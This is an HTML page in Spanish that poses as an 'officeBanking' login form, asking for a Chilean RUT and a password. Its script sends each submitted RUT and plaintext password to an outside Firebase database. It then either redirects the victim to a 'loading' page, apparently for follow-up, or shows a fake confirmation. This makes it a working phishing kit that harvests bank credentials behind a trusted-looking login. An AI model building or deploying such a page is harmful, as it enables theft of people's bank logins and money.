<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Ingreso a officeBanking</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    h2 {
      color: black;
    }
    .banking {
      background-color: red;
      color: white;
      padding: 2px 8px;
      border-radius: 4px;
      margin-left: 5px;
    }
    form {
      border: 2px solid red;
      padding: 20px;
      border-radius: 10px;
      background-color: white;
      display: flex;
      flex-direction: column;
      width: 90%;
      max-width: 300px;
    }
    input {
      margin: 10px 0;
      padding: 10px;
      font-size: 18px;
      border: 1px solid black;
      border-radius: 5px;
      width: calc(100% - 22px);
    }
    .input-container {
      position: relative;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 14px;
      cursor: pointer;
    }
    button {
      margin-top: 10px;
      padding: 10px;
      font-size: 18px;
      background-color: red;
      color: white;
      border: none;
      border-radius: 5px;
    }
    .mensaje-final {
      border: 2px solid red;
      padding: 20px;
      border-radius: 10px;
      color: red;
      font-size: 20px;
      background: white;
      text-align: center;
    }
  </style>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking",
      storageBucket: "formulario-officebanking.appspot.com",
      messagingSenderId: "604053438195",
      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
    };
    firebase.initializeApp(firebaseConfig);

    function formatoRUT(rut) {
      rut = rut.replace(/[.-]/g, '').replace(/^0+/, '');
      if (rut.length > 1) {
        let cuerpo = rut.slice(0, -1);
        let dv = rut.slice(-1);
        cuerpo = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
        return cuerpo + "-" + dv;
      }
      return rut;
    }

    function validarRUT(rutCompleto) {
      rutCompleto = rutCompleto.replace(/\./g, "").replace("-", "");
      const rut = rutCompleto.slice(0, -1);
      const dv = rutCompleto.slice(-1).toUpperCase();
      let suma = 0;
      let multiplo = 2;

      for (let i = rut.length - 1; i >= 0; i--) {
        suma += parseInt(rut[i]) * multiplo;
        multiplo = multiplo < 7 ? multiplo + 1 : 2;
      }

      const dvEsperado = 11 - (suma % 11);
      const dvFinal = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
      return dv === dvFinal;
    }

    function togglePassword() {
      const input = document.getElementById("clave");
      input.type = input.type === "password" ? "text" : "password";
    }

    function enviarFormulario(e) {
      e.preventDefault();
      const rut = document.getElementById("rut").value;
      const clave = document.getElementById("clave").value;

      if (!validarRUT(rut)) {
        alert("RUT inv√°lido");
        return;
      }

      firebase.database().ref("usuarios").push({
        rut: rut,
        clave: clave,
        timestamp: new Date().toLocaleString("es-CL")
      }).then(() => {
        firebase.database().ref("modo_asistente").once("value").then((snap) => {
          const estado = snap.val();
          if (estado === "activo") {
            window.location.href = "cargando1.html";
          } else {
            document.getElementById("formulario").style.display = "none";
            document.getElementById("mensajeFinal").style.display = "block";
          }
        });
      });
    }

    window.onload = () => {
      document.getElementById("rut").addEventListener("input", function () {
        this.value = formatoRUT(this.value.replace(/[^0-9kK]/g, "").toUpperCase());
      });
    };
  </script>
</head>
<body>
  <h2>Ingreso a <span class="banking">officeBanking</span></h2>

  <form id="formulario" onsubmit="enviarFormulario(event)">
    <input type="text" id="rut" placeholder="RUT" required maxlength="12" />
    <div class="input-container">
      <input type="password" id="clave" placeholder="Contrase√±a" required maxlength="12" />
      <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>
    <button type="submit">Ingresar</button>
  </form>

  <div id="mensajeFinal" class="mensaje-final" style="display:none;">
    Hemos recibido tu solicitud correctamente.
  </div>
</body>
</html>
